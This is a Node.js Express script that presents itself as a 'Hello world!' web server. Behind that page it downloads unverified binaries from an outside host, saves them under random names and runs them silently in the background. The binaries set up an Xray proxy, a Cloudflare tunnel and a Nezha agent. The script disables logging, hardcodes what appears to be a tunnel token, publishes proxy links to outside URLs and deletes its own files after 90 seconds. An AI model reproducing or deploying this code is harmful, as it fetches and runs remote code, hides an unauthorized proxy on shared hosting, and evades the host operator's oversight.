// =========================
// 基础依赖
// =========================
const express = require("express");
const axios = require("axios");
const os = require("os");
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');

const app = express();

// =========================
// 环境变量（不修改）
// =========================
const UPLOAD_URL = process.env.UPLOAD_URL || '';
const PROJECT_URL = process.env.PROJECT_URL || '';
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;
const FILE_PATH = process.env.FILE_PATH || './tmp';
const SUB_PATH = process.env.SUB_PATH || 'sub';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;

const UUID = process.env.UUID || '58b8bf1b-b1b3-4397-bab9-4bee0ed4e72a';
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || '';

const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'npc666.6669993.xyz';
const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiOTVjMzQxZWE5NzQ4MDhmYTljZGU2MDQ4NWE3MjNkNTQiLCJ0IjoiYjc3ZWFlY2EtZTU3Ny00NGVhLThiMGYtMTUzOGYyOWVhM2NiIiwicyI6Ik5qa3hNRGd6Tm1JdE5UUmhaUzAwWkRBNUxUbG1ZMk10TkRjNFlUUXlaR1psWmpneiJ9';

const ARGO_PORT = process.env.ARGO_PORT || 8001;
const CFIP = process.env.CFIP || 'cdns.doon.eu.org';
const CFPORT = process.env.CFPORT || 443;
const NAME = process.env.NAME || 'jiatingnpc';

// =========================
// 路径管理
// =========================
if (!fs.existsSync(FILE_PATH)) fs.mkdirSync(FILE_PATH);

function randName() {
  return [...Array(6)].map(() => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random()*26)]).join("");
}

const paths = {
  npm: path.join(FILE_PATH, randName()),
  php: path.join(FILE_PATH, randName()),
  web: path.join(FILE_PATH, randName()),
  bot: path.join(FILE_PATH, randName()),
  sub: path.join(FILE_PATH, "sub.txt"),
  list: path.join(FILE_PATH, "list.txt"),
  boot: path.join(FILE_PATH, "boot.log"),
  config: path.join(FILE_PATH, "config.json"),
};

// =========================
// 工具函数
// =========================
async function safeExec(cmd) {
  try { await exec(cmd); }
  catch { }
}

function chmodExec(fileList) {
  fileList.forEach(f => fs.existsSync(f) && fs.chmodSync(f, 0o775));
}

function getArch() {
  return ["arm", "arm64", "aarch64"].includes(os.arch()) ? "arm" : "amd";
}

function download(file, url) {
  return new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(file);
    axios({ method: "get", url, responseType: "stream" })
      .then(res => {
        res.data.pipe(writer);
        writer.on("finish", () => resolve());
        writer.on("error", reject);
      })
      .catch(reject);
  });
}

// =========================
// 下载文件
// =========================
function buildDownloadList() {
  const arch = getArch();
  const bucket = arch === "arm" ? "arm64" : "amd64";

  const base = [
    { path: paths.web, url: `https://${bucket}.ssss.nyc.mn/web` },
    { path: paths.bot, url: `https://${bucket}.ssss.nyc.mn/bot` },
  ];

  if (NEZHA_SERVER && NEZHA_KEY) {
    const agentUrl = NEZHA_PORT
      ? `https://${bucket}.ssss.nyc.mn/agent`
      : `https://${bucket}.ssss.nyc.mn/v1`;

    base.unshift({ path: NEZHA_PORT ? paths.npm : paths.php, url: agentUrl });
  }

  return base;
}

async function downloadAll() {
  for (const f of buildDownloadList()) {
    await download(f.path, f.url);
  }

  chmodExec([
    paths.web,
    paths.bot,
    ...(NEZHA_PORT ? [paths.npm] : (NEZHA_SERVER && NEZHA_KEY ? [paths.php] : []))
  ]);
}

// =========================
// XR-ay 配置
// =========================
function writeXrayConfig() {
  const cfg = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      {
        port: ARGO_PORT,
        protocol: 'vless',
        settings: {
          clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
          decryption: 'none',
          fallbacks: [
            { dest: 3001 },
            { path: "/vless-argo", dest: 3002 },
            { path: "/vmess-argo", dest: 3003 },
            { path: "/trojan-argo", dest: 3004 }
          ]
        },
        streamSettings: { network: 'tcp' }
      },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "ws", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http","tls","quic"] } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http","tls","quic"] } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http","tls","quic"] } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [
      { protocol: "freedom", tag: "direct" },
      { protocol: "blackhole", tag: "block" }
    ]
  };

  fs.writeFileSync(paths.config, JSON.stringify(cfg, null, 2));
}

// =========================
// 运行各服务
// =========================
async function runNezha() {
  if (!NEZHA_SERVER || !NEZHA_KEY) return;

  if (!NEZHA_PORT) {
    // v1
    const tlsPorts = new Set(['443','8443','2096','2087','2083','2053']);
    const port = NEZHA_SERVER.split(":").pop();
    const nezhatls = tlsPorts.has(port) ? 'true' : 'false';

    const conf = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_force_update: true
server: ${NEZHA_SERVER}
tls: ${nezhatls}
uuid: ${UUID}`;

    fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), conf);
    await safeExec(`nohup ${paths.php} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`);
  } else {
    const tlsPorts = ['443','8443','2096','2087','2083','2053'];
    const tls = tlsPorts.includes(NEZHA_PORT) ? "--tls" : "";
    await safeExec(`nohup ${paths.npm} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${tls} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`);
  }
}

async function runXray() {
  await safeExec(`nohup ${paths.web} -c ${paths.config} >/dev/null 2>&1 &`);
}

async function runTunnel() {
  let args;

  if (/^[A-Za-z0-9=]{120,250}$/.test(ARGO_AUTH)) {
    args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
  } else if (ARGO_AUTH.includes("TunnelSecret")) {
    args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
  } else {
    args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${paths.boot} --loglevel info --url http://localhost:${ARGO_PORT}`;
  }

  await safeExec(`nohup ${paths.bot} ${args} >/dev/null 2>&1 &`);
}

// =========================
// Cloudflare 固定隧道
// =========================
function initTunnelConfig() {
  if (!ARGO_AUTH.includes("TunnelSecret")) return;

  fs.writeFileSync(path.join(FILE_PATH, "tunnel.json"), ARGO_AUTH);

  const yaml = `
tunnel: ${ARGO_AUTH.split('"')[11]}
credentials-file: ${path.join(FILE_PATH, "tunnel.json")}
protocol: http2
ingress:
  - hostname: ${ARGO_DOMAIN}
    service: http://localhost:${ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404`;

  fs.writeFileSync(path.join(FILE_PATH, "tunnel.yml"), yaml);
}

// =========================
// 订阅生成
// =========================
async function generateSubscription(domain) {
  const isp = execSync(
    'curl -sm 5 https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
    { encoding: "utf8" }
  ).trim();

  const nodeName = NAME ? `${NAME}-${isp}` : isp;

  const vmess = {
    v: '2',
    ps: nodeName,
    add: CFIP,
    port: CFPORT,
    id: UUID,
    aid: '0',
    scy: 'none',
    net: 'ws',
    type: 'none',
    host: domain,
    path: '/vmess-argo?ed=2560',
    tls: 'tls',
    sni: domain,
    fp: 'firefox',
  };

  const txt = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${domain}&fp=firefox&type=ws&host=${domain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}

vmess://${Buffer.from(JSON.stringify(vmess)).toString("base64")}

trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${domain}&fp=firefox&type=ws&host=${domain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}
`;

  const b64 = Buffer.from(txt).toString("base64");
  fs.writeFileSync(paths.sub, b64);

  app.get(`/${SUB_PATH}`, (req, res) => {
    res.set("Content-Type", "text/plain; charset=utf-8");
    res.send(b64);
  });

  uploadNodes();
}

// =========================
// 上传节点/订阅
// =========================
async function uploadNodes() {
  if (!UPLOAD_URL) return;

  if (UPLOAD_URL && PROJECT_URL) {
    const data = { subscription: [`${PROJECT_URL}/${SUB_PATH}`] };

    try {
      await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, data);
    } catch {}
    return;
  }

  if (fs.existsSync(paths.list)) {
    const lines = fs.readFileSync(paths.list, "utf8")
      .split("\n")
      .filter(i => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(i));

    if (!lines.length) return;

    try {
      await axios.post(`${UPLOAD_URL}/api/add-nodes`, { nodes: lines });
    } catch {}
  }
}

// =========================
// 自动访问任务
// =========================
async function autoVisit() {
  if (!AUTO_ACCESS || !PROJECT_URL) return;

  try {
    await axios.post("https://oooo.serv00.net/add-url", { url: PROJECT_URL });
  } catch {}
}

// =========================
// 隧道域名读取
// =========================
async function detectDomainAndGenerateSub() {
  if (ARGO_AUTH && ARGO_DOMAIN) return generateSubscription(ARGO_DOMAIN);

  if (!fs.existsSync(paths.boot)) return;

  const content = fs.readFileSync(paths.boot, "utf8");
  const match = content.match(/https?:\/\/([^ ]*trycloudflare\.com)/);

  if (match) {
    return generateSubscription(match[1]);
  }

  // 重启 Cloudflared 获取域名
  fs.unlinkSync(paths.boot);
  await safeExec(`pkill -f "${path.basename(paths.bot)}"`);
  await runTunnel();
  await new Promise(r => setTimeout(r, 3000));

  return detectDomainAndGenerateSub();
}

// =========================
// 文件清理
// =========================
function scheduleCleanup() {
  setTimeout(() => {
    const delList = [
      paths.boot,
      paths.config,
      paths.web,
      paths.bot,
      ...(NEZHA_PORT ? [paths.npm] : (NEZHA_SERVER && NEZHA_KEY ? [paths.php] : []))
    ];

    safeExec(`rm -rf ${delList.join(" ")} >/dev/null 2>&1`);
  }, 90000);
}

// =========================
// 主函数
// =========================
async function main() {
  writeXrayConfig();
  initTunnelConfig();
  await downloadAll();
  await runNezha();
  await runXray();
  await runTunnel();
  await new Promise(r => setTimeout(r, 3000));
  await detectDomainAndGenerateSub();
  await autoVisit();
  scheduleCleanup();
}

main();
app.get("/", (req, res) => res.send("Hello world!"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
